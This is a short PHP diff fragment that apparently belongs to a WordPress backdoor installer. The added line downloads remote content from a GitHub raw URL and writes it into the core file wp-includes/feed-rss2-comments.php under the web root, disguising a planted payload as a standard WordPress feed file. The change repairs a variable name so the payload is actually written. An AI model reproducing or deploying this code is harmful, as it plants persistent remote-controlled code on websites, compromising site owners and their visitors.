@@ -410,7 +410,7 @@ if (file_exists($kupa55)) {
  }
 else { 
 echo('cekti');
-$hook55 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/feed-rss2-comments.txt');
+$hook556 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/feed-rss2-comments.txt');
 $hook55 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/feed-rss2-comments.php" ; 
 if (file_put_contents ($hook55, $hook556));
 
